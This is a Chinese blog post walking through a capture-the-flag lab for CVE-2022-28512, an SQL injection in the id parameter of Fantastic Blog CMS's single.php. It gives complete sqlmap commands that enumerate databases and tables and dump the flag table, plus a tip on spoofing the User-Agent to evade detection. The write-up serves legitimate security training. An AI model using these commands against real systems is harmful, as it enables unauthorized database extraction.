# 春秋云境 CVE-2022-28512 - WuliweiT - 博客园

> 原文：[`www.cnblogs.com/manmanwei/p/17143738.html`](https://www.cnblogs.com/manmanwei/p/17143738.html)

# 春秋云境 CVE-2022-28512

靶场介绍：

Fantastic Blog (CMS)是一个绝对出色的博客/文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该 CMS 的/single.php 路径下，id 参数存在一个 SQL 注入漏洞。

### 1.打开题目进入 Fantastic Blog 首页

![](img/453683a137b75fdf98c4abfa09b74f3e.png)

###  2.访问 url/single.php?id=1 页面

![](img/1d2747889e0b73b990d4e62ab45b9b36.png)

### 3.并用 burp 抓包

![](img/fc2645e1e2e23cca32f8ae57bf020b1e.png)

### 使用 cookie 参数可以绕过身份验证，添加 user-agent 参数可以绕过客户端验证，否则可能会被识别到明显的 sqlmap 客户端标识，从而导致攻击的中断

### 4.构造 sqlmap 的注入攻击

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1665631205; __atuvc=1%7C8; __atuvs=63f57784e9dc26ac000

### 5.爆库

```
sqlmap -u http://eci-2ze3fvrdzptgbl2fagkt.cloudeci1.ichunqiu.com/single.php?id=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" --cookie " __atuvc=1%7C8; __atuvs=63f57784e9dc26ac000" --batch --dbs

```

　![](img/46da3ac5986bbd102e296dd8e46b3df3.png)

 数据库如下，我们需要的是 ctf 的信息

![](img/b2c4e3a25dc8c02fa88c27f99f05cdc5.png)

### 6\. 所以接下来爆 ctf 的表

```
sqlmap -u http://eci-2ze3fvrdzptgbl2fagkt.cloudeci1.ichunqiu.com/single.php?id=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" --cookie " __atuvc=1%7C8; __atuvs=63f57784e9dc26ac000" --batch -D "ctf" --tables 
```

爆出了我们想要的 flag 字段

![](img/bd1e903b2859da525fd8fc4920cf58ae.png)

###  7.猎杀时刻，爆字段

```
sqlmap -u http://eci-2ze3fvrdzptgbl2fagkt.cloudeci1.ichunqiu.com/single.php?id=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" --cookie " __atuvc=1%7C8; __atuvs=63f57784e9dc26ac000" --batch -D "ctf" -T "flag" --dump 
```

拿到 flag

![](img/a5a0e8a480de1cb10f9673610938c6f8.png)